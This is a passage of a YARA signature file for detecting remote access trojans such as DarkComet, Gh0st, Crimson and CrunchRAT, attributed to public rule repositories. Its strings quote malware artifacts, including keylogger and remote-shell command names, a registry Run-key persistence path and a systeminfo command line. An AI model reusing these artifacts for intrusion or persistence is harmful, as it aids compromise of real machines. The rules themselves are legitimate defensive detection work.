nocase\n        $d = \"untPlugin\" nocase\n        $e = \"gethostbyname\" nocase\n\n    condition:\n        all of them\n}\n\nrule RAT_ClientMesh\n{\n    meta:\n        description = \"ClientMesh RAT\"\n        ref = \"http://malwareconfig.com/stats/ClientMesh\"\n        classifications = \"Backdoor\"\n        threat_names = \"ClientMesh\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net> (slightly modified by Florian Roth to improve performance)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_ClientMesh\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $string1 = \"machinedetails\"\n        $string2 = \"MySettings\"\n        $string3 = \"sendftppasswords\"\n        $string4 = \"sendbrowserpasswords\"\n        $string5 = \"arma2keyMass\"\n        $string6 = \"keylogger\"\n\n    condition:\n        all of them\n}\n\nprivate rule ComfooCode : Comfoo Family\n{\n    meta:\n        description = \"Comfoo code features\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"ComfooCode\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $resource = { 6A 6C 6A 59 55 E8 01 FA FF FF }\n\n    condition:\n        any of them\n}\n\nprivate rule ComfooStrings : Comfoo Family\n{\n    meta:\n        description = \"Comfoo Identifying Strings\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"ComfooStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"fefj90\"\n        $ = \"iamwaitingforu653890\"\n        $ = \"watchevent29021803\"\n        $ = \"THIS324NEWGAME\"\n        $ = \"ms0ert.temp\"\n        $ = \"\\\\mstemp.temp\"\n\n    condition:\n        any of them\n}\n\nrule Comfoo : Family\n{\n    meta:\n        description = \"Comfoo RAT\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Comfoo\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"Comfoo\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        ComfooCode or ComfooStrings\n}\n\nrule ProjectM_CrimsonDownloader\n{\n    meta:\n        description = \"Crimson RAT downloader\"\n        ref = \"http://researchcenter.paloaltonetworks.com/2016/03/unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe/\"\n        classifications = \"Backdoor, Downloader\"\n        threat_names = \"Crimson\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ProjectM_CrimsonDownloader\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"E:\\\\Projects\\\\m_project\\\\main\\\\mj shoaib\"\n        $s1 = \"\\\\obj\\\\x86\\\\Debug\\\\secure_scan.pdb\" ascii\n        $s2 = \"secure_scan.exe\" fullword wide\n        $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|mswall\" fullword wide\n        $s4 = \"secure_scan|mswall\" fullword wide\n        $s5 = \"[Microsoft-Security-Essentials]\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and $x1) or (all of them)\n}\n\nrule CrimsonRAT_Mar18_1\n{\n    meta:\n        description = \"Crimson RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Crimson\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CrimsonRAT_Mar18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|\" wide\n        $x2 = \"\\\\Release\\\\RTLBot.pdb\" ascii\n        $x3 = \"cmd.exe/c systeminfo >> 1.txt\" fullword wide\n        $x4 = \"/online >> Get online target with important info\" fullword wide\n        $x5 = \"/screen >> ScreenShot from target PC\" fullword wide\n        $x6 = \"/restart >> Restart Target PC\" fullword wide\n        $x7 = \"/log_key >> Get log key file\" fullword wide\n        $a1 = \"get_ShiftKey\" fullword ascii\n        $a2 = \"get_ControlKey\" fullword ascii\n        $a3 = \"get_AltKey\" fullword ascii\n        $a4 = \"get_MineInterval\" fullword ascii\n        $fp1 = \"Copyright Software Secure\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and (1 of ($x*) or all of ($a*)) and not 1 of ($fp*)\n}\n\nrule Crimson : RAT\n{\n    meta:\n        description = \"Crimson RAT\"\n        ref = \"http://malwareconfig.com/stats/Crimson\"\n        classifications = \"Backdoor\"\n        threat_names = \"Crimson\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Crimson\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"com/crimson/PK\"\n        $a2 = \"com/crimson/bootstrapJar/PK\"\n        $a3 = \"com/crimson/permaJarMulti/PermaJarReporter$1.classPK\"\n        $a4 = \"com/crimson/universal/containers/KeyloggerLog.classPK\"\n        $a5 = \"com/crimson/universal/UploadTransfer.classPK\"\n\n    condition:\n        all of ($a*)\n}\n\nrule CrunchRAT\n{\n    meta:\n        description = \"CrunchRAT malware\"\n        ref = \"https://github.com/t3ntman/CrunchRAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"CrunchRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CrunchRAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"----CrunchRAT\" fullword wide\n        $x2 = \"\\\\Debug\\\\CrunchRAT\" ascii\n        $x3 = \"\\\\Release\\\\CrunchRAT\" ascii\n        $s1 = \"runCommand\" fullword ascii\n        $s2 = \"<action>download<action>\" fullword wide\n        $s3 = \"Content-Disposition: form-data; name=action\" fullword wide\n        $s4 = \"<action>upload<action>\" fullword wide\n        $s5 = \"/update.php\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and (1 of ($x*) and 3 of them)\n}\n\nrule malware_windows_t3ntman_crunchrat\n{\n    meta:\n        description = \"CrunchRAT malware\"\n        ref = \"https://github.com/t3ntman/CrunchRAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"CrunchRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"malware_windows_t3ntman_crunchrat\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"<action>command<action>\" wide ascii\n        $a2 = \"<action>upload<action>\" wide ascii\n        $a3 = \"<action>download<action>\" wide ascii\n        $a4 = \"cmd.exe\" wide ascii\n        $a5 = \"application/x-www-form-urlencoded\" wide ascii\n        $a6 = \"&action=\" wide ascii\n        $a7 = \"&secondary=\" wide ascii\n        $a8 = \"<secondary>\" wide ascii\n        $a9 = \"<action>\" wide ascii\n\n    condition:\n        all of ($a*)\n}\n\nrule RAT_CyberGate\n{\n    meta:\n        description = \"CyberGate RAT\"\n        ref = \"http://malwareconfig.com/stats/CyberGate\"\n        classifications = \"Backdoor\"\n        threat_names = \"CyberGate\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_CyberGate\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $string1 = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}\n        $string2 = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}\n        $string3 = \"EditSvr\"\n        $string4 = \"TLoader\"\n        $string5 = \"Stroks\"\n        $string6 = \"####@####\"\n        $res1 = \"XX-XX-XX-XX\"\n        $res2 = \"CG-CG-CG-CG\"\n\n    condition:\n        all of ($string*) and any of ($res*)\n}\n\nrule ProjectM_DarkComet_1\n{\n    meta:\n        description = \"DarkComet RAT\"\n        ref = \"http://researchcenter.paloaltonetworks.com/2016/03/unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe/\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"DarkComet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ProjectM_DarkComet_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"DarkO\\\\_2\" fullword ascii\n        $a1 = \"AVICAP32.DLL\" fullword ascii\n        $a2 = \"IDispatch4\" fullword ascii\n        $a3 = \"FLOOD/\" fullword ascii\n        $a4 = \"T<-/HTTP://\" fullword ascii\n        $a5 = \"infoes\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and 4 of them) or (all of them)\n}\n\nrule RAT_DarkComet\n{\n    meta:\n        description = \"DarkComet RAT\"\n        ref = \"http://malwareconfig.com/stats/DarkComet\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"DarkComet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_DarkComet\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"#BOT#URLUpdate\"\n        $a2 = \"Command successfully executed!\"\n        $a3 = \"MUTEXNAME\" wide\n        $a4 = \"NETDATA\" wide\n        $b1 = \"FastMM Borland Edition\"\n        $b2 = \"%s, ClassID: %s\"\n        $b3 = \"I wasn't able to open the hosts file\"\n        $b4 = \"#BOT#VisitUrl\"\n        $b5 = \"#KCMDDC\"\n\n    condition:\n        all of ($a*) or all of ($b*)\n}\n\nrule DarkComet_1 : RAT\n{\n    meta:\n        description = \"DarkComet RAT\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"DarkComet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"botherder https://github.com/botherder\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DarkComet_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $bot1 = /(#)BOT#OpenUrl/ wide ascii\n        $bot2 = /(#)BOT#Ping/ wide ascii\n        $bot3 = /(#)BOT#RunPrompt/ wide ascii\n        $bot4 = /(#)BOT#SvrUninstall/ wide ascii\n        $bot5 = /(#)BOT#URLDownload/ wide ascii\n        $bot6 = /(#)BOT#URLUpdate/ wide ascii\n        $bot7 = /(#)BOT#VisitUrl/ wide ascii\n        $bot8 = /(#)BOT#CloseServer/ wide ascii\n        $ddos1 = /(D)DOSHTTPFLOOD/ wide ascii\n        $ddos2 = /(D)DOSSYNFLOOD/ wide ascii\n        $ddos3 = /(D)DOSUDPFLOOD/ wide ascii\n        $keylogger1 = /(A)ctiveOnlineKeylogger/ wide ascii\n        $keylogger2 = /(U)nActiveOnlineKeylogger/ wide ascii\n        $keylogger3 = /(A)ctiveOfflineKeylogger/ wide ascii\n        $keylogger4 = /(U)nActiveOfflineKeylogger/ wide ascii\n        $shell1 = /(A)CTIVEREMOTESHELL/ wide ascii\n        $shell2 = /(S)UBMREMOTESHELL/ wide ascii\n        $shell3 = /(K)ILLREMOTESHELL/ wide ascii\n\n    condition:\n        4 of ($bot*) or all of ($ddos*) or all of ($keylogger*) or all of ($shell*)\n}\n\nrule DarkComet_2 : rat\n{\n    meta:\n        description = \"DarkComet RAT\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"DarkComet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jean-Philippe Teissier / @Jipe_\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DarkComet_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"#BEGIN DARKCOMET DATA --\"\n        $b = \"#EOF DARKCOMET DATA --\"\n        $c = \"DC_MUTEX-\"\n        $k1 = \"#KCMDDC5#-890\"\n        $k2 = \"#KCMDDC51#-890\"\n\n    condition:\n        any of them\n}\n\nrule DarkComet_5\n{\n    meta:\n        description = \"DarkComet RAT\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"DarkComet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"https://github.com/reed1713\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DarkComet_5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $type = \"Microsoft-Windows-Security-Auditing\"\n        $eventid = \"4688\"\n        $data = /AppData\\\\Local\\\\Temp\\\\MSDCSC\\\\.+\\.exe/\n        $type1 = \"Microsoft-Windows-Security-Auditing\"\n        $eventid1 = \"4674\"\n        $data1 = /DC_MUTEX-[0-9A-Z]{7}/\n\n    condition:\n        ($type and $eventid and $data) or ($type1 and $eventid1 and $data1)\n}\n\nrule DarkCometConfig\n{\n    meta:\n        description = \"DarkComet RAT configuration\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"DarkComet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"KillerInstinct\"\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"DarkCometConfig\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $buf = /#BEGIN\\sDARKCOMET[A-Za-z0-9\\r\\n\\s\\-\\=\\_\\{\\}\\.:\\\\\\/]*\\#EOF\\sDARKCOMET\\sDATA\\s--/s\n\n    condition:\n        $buf\n}\n\nrule DarkComet_Keylogger_File\n{\n    meta:\n        description = \"DarkComet RAT keylogger file\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"DarkComet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"DarkComet_Keylogger_File\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $entry = /\\n:: [A-Z]/\n        $timestamp = /\\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\\)/\n\n    condition:\n        uint16(0) == 0x3A3A and #entry > 10 and #timestamp > 10\n}\n\nrule RAT_DarkRAT\n{\n    meta:\n        description = \"DarkRAT malware\"\n        ref = \"http://malwareconfig.com/stats/DarkRAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"DarkRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_DarkRAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"@1906dark1996coder@\"\n        $b = \"SHEmptyRecycleBinA\"\n        $c = \"mciSendStringA\"\n        $d = \"add_Shutdown\"\n        $e = \"get_SaveMySettingsOnExit\"\n        $f = \"get_SpecialDirectories\"\n        $g = \"Client.My\"\n\n    condition:\n        all of them\n}\n\nrule dendroid\n{\n    meta:\n        description = \"Dendroid RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Dendroid\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"dendroid\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"/upload-pictures.php?\"\n        $s2 = \"Opened Dialog:\"\n        $s3 = \"com/connect/MyService\"\n        $s4 = \"android/os/Binder\"\n        $s5 = \"android/app/Service\"\n\n    condition:\n        all of them\n}\n\nrule FakeM_Generic\n{\n    meta:\n        description = \"FakeM RAT\"\n        ref = \"http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/\"\n        classifications = \"Backdoor\"\n        threat_names = \"FakeM\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FakeM_Generic\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"\\\\system32\\\\kernel32.dll\" fullword ascii\n        $a2 = \"\\\\boot.lnk\" fullword ascii\n        $a3 = \"%USERPROFILE%\" fullword ascii\n        $b1 = \"Wizard.EXE\" fullword wide\n        $b2 = \"CommandLineA\" fullword ascii\n        $c1 = \"\\\\system32\\\\kernel32.dll\" fullword ascii\n        $c2 = \"\\\\aapz.tmp\" fullword ascii\n        $e1 = \"C:\\\\Documents and Settings\\\\A\\\\\" fullword ascii\n        $e2 = \"\\\\svchost.exe\" fullword ascii\n        $e3 = \"\\\\Perform\\\\Release\\\\Perform.pdb\" fullword ascii\n        $f1 = \"Browser.EXE\" fullword wide\n        $f2 = \"\\\\browser.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and (all of ($a*) or all of ($b*) or all of ($c*) or all of ($e*) or 1 of ($f*))\n}\n\nrule HTMLVariant : FakeM Family HTML Variant\n{\n    meta:\n        description = \"FakeM RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"FakeM\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"HTMLVariant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = { 8B 55 08 B9 00 50 00 00 8D 3D ?? ?? ?? 00 8B F7 AD 33 C2 AB 83 E9 04 85 C9 75 F5 }\n        $s2 = { C6 45 F? (3?|4?) }\n\n    condition:\n        $s1 and #s2 == 16\n}\n\nrule TA17_318A_rc4_stack_key_fallchill\n{\n    meta:\n        description = \"FALLCHILL RAT RC4 key\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-318B\"\n        classifications = \"Backdoor\"\n        threat_names = \"FALLCHILL, Lazarus, Hidden Cobra\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TA17_318A_rc4_stack_key_fallchill\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $stack_key = { 0d 06 09 2a ?? ?? ?? ?? 86 48 86 f7 ?? ?? ?? ?? 0d 01 01 01 ?? ?? ?? ?? 05 00 03 82 41 8b c9 41 8b d1 49 8b 40 08 48 ff c2 88 4c 02 ff ff c1 81 f9 00 01 00 00 7c eb }\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $stack_key\n}\n\nrule TA17_318A_success_fail_codes_fallchill\n{\n    meta:\n        description = \"FALLCHILL RAT error codes\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-318B\"\n        classifications = \"Backdoor\"\n        threat_names = \"FALLCHILL, Lazarus, Hidden Cobra\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TA17_318A_success_fail_codes_fallchill\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = { 68 7a 34 12 00 }\n        $s1 = { ba 7a 34 12 00 }\n        $f0 = { 68 5c 34 12 00 }\n        $f1 = { ba 5c 34 12 00 }\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and (($s0 and $f0) or ($s1 and $f1))\n}\n\nrule FlyingKitten : rat\n{\n    meta:\n        description = \"Flying Kitten RAT\"\n        ref = \"http://blog.crowdstrike.com/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten\"\n        classifications = \"Backdoor\"\n        threat_names = \"Flying Kitten\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CrowdStrike, Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FlyingKitten\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $classpath = \"Stealer.Properties.Resources.resources\"\n        $pdbstr = \"\\\\Stealer\\\\obj\\\\x86\\\\Release\\\\Stealer.pdb\"\n\n    condition:\n        all of them and uint16(0) == 0x5A4D and uint32(uint32(0x3c)) == 0x4550 and uint16(uint32(0x3C) + 0x16) & 0x2000 == 0 and ((uint16(uint32(0x3c) + 24) == 0x010b and uint32(uint32(0x3c) + 232) > 0) or (uint16(uint32(0x3c) + 24) == 0x020b and uint32(uint32(0x3c) + 248) > 0))\n}\n\nrule FlyingKitten_CSIT_14003_03 : installer RAT\n{\n    meta:\n        description = \"Flying Kitten RAT installer\"\n        ref = \"http://blog.crowdstrike.com/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten\"\n        classifications = \"Backdoor\"\n        threat_names = \"Flying Kitten\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CrowdStrike, Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"CSIT_14003_03\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $exename = \"IntelRapidStart.exe\"\n        $confname = \"IntelRapidStart.exe.config\"\n        $cabhdr = { 4d 53 43 46 00 00 00 00 }\n\n    condition:\n        all of them\n}\n\nrule GhostDragon_Gh0stRAT\n{\n    meta:\n        description = \"Gh0st RAT\"\n        ref = \"https://blog.cylance.com/the-ghost-dragon\"\n        classifications = \"Backdoor\"\n        threat_names = \"Gh0st RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GhostDragon_Gh0stRAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"REG ADD HKEY_LOCAL_MACHINE\\\\%s /v ServiceDll /t REG_EXPAND_SZ /d \\\"%s\\\"\" fullword ascii\n        $x2 = \"Global\\\\REALCHEL_GLOBAL_SUBMIT_20031020_\" fullword ascii\n        $x3 = \"\\\\xclolg2.tmp\" fullword ascii\n        $x4 = \"Http/1.1 403 Forbidden\" fullword ascii\n        $x5 = \"%sxsd%d.pif\" fullword ascii\n        $x6 = \"%s\\\\%s32.dl_\" fullword ascii\n        $x7 = \"%-23s %-16s  0x%x(%02d)\" fullword ascii\n        $x8 = \"RegSetValueEx(start)\" fullword ascii\n        $x9 = \"%s\\\\%s64.dl_\" fullword ascii\n        $x10 = \"$#REGMASTERKEY$\u001fWebCat was successfully started\" fullword wide\n        $s1 = \"viewsc.dll\" fullword ascii\n        $s2 = \"Proxy-Connection:   Keep-Alive\" fullword ascii\n        $s3 = \"\\\\sfc_os.dll\" fullword ascii\n        $s4 = \"Mozilla/4.0 (compatible)\" fullword ascii\n        $s5 = \"Http/1.1 403 Forbidden\" fullword ascii\n        $s6 = \"CONNECT   %s:%d   HTTP/1.1\" fullword ascii\n        $s7 = \"WindowsUpperVersion\" fullword ascii\n        $s8 = \"[%d-%d-%d %d:%d:%d] (%s)\" fullword ascii\n        $s9 = \"SOFTWARE\\\\Microsoft\\\\DataAccess\\\\%s\" fullword ascii\n        $s10 = \"%s sp%d(%d)\" fullword ascii\n        $s11 = \"OpenSC ERROR \" fullword ascii\n        $s12 = \"get rgspath error \" fullword ascii\n        $s13 = \"Global\\\\GLOBAL_SUBMIT_0234_\" fullword ascii\n        $s14 = \"Global\\\\_vc_ck_ %d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and (1 of ($x*) or 4 of ($s*))) or (6 of them)\n}\n\nrule GhostDragon_Gh0stRAT_Sample2\n{\n    meta:\n        description = \"Gh0st RAT\"\n        ref = \"https://blog.cylance.com/the-ghost-dragon\"\n        classifications = \"Backdoor\"\n        threat_names = \"Gh0st RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GhostDragon_Gh0stRAT_Sample2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"AdobeWpk\" fullword ascii\n        $x2 = \"seekin.dll\" fullword ascii\n        $c1 = \"Windows NT 6.1; Trident/6.0)\" fullword ascii\n        $c2 = \"Mozilla/5.0 (compatible; MSIE 10.0; \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and (all of ($x*) or all of ($c*))) or (all of them)\n}\n\nrule GhostDragon_Gh0stRAT_Sample3\n{\n    meta:\n        description = \"Gh0st RAT\"\n        ref = \"https://blog.cylance.com/the-ghost-dragon\"\n        classifications = \"Backdoor\"\n        threat_names = \"Gh0st RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GhostDragon_Gh0stRAT_Sample3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $op1 = { 44 24 15 65 88 54 24 16 c6 44 24 }\n        $op2 = { 44 24 1b 43 c6 44 24 1c 75 88 54 24 1e }\n        $op3 = { 1e 79 c6 44 24 1f 43 c6 44 24 20 75 88 54 24 22 }\n\n    condition:\n        all of them\n}\n\nrule Gh0st : RAT\n{\n    meta:\n        description = \"Gh0st RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Gh0st RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"botherder https://github.com/botherder\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Gh0st\"\n        license = \"GPL-2.0 